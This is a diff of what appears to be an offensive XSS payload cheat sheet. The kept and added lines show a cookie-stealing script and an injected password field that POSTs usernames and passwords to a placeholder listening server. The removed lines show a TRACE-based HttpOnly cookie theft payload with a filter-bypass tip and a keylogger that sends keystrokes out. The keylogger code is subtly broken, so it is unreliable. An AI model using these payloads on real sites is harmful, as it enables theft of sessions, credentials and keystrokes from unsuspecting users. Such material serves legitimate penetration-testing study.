@@ -71,32 +71,11 @@ Create an instance of server listening on a public port. After sending the follo
 
 ```
 <script>
-fetch('<listening server>', {
+fetch('<server>', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
-</script>
-```
-
-### Cross Trace Scripting
-
-By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server&#x20;
-
-```
-<script>
-var req = new XMLHttpRequest();
-req.onload = handleResponse;
-req.withCredentials = true;
-req.open('TRACE','<URL>',true);        #putting \r\nTRACE instead of TRACE might bypass some option filters
-req.send();
-function handleResponse() {
-    fetch('<listening server>', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: this.getAllResponseHeaders()
-        });
-};
 </script>
 ```
 
@@ -106,33 +85,11 @@ Create an instance of server listening on a public port. Send the following payl
 
 ```
 <input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('<listening server>',{
+<input type=password name=password onchange="if(this.value.length)fetch('<server>',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
 });">
-```
-
-### Keylogging
-
-The following script sends the keys pressed by the user to the listening server
-
-```
-var keys = "";
-document.onkeypress = function(e){
-    var get = window.event ? event : e;
-    var key = get.keyCode ? get.keyCode : get.charCode;
-    key = String.fromCharCode(key);
-    key += key;
-}
-
-window.setInterval(function(){
-    if(keys && keys !== ""){
-        var path = encodeURI("<listening server>?keys="+keys);
-        new Image().src = path;
-        keys = "";
-    }
-},<log interval ms>);
 ```
 
 ### CSRF
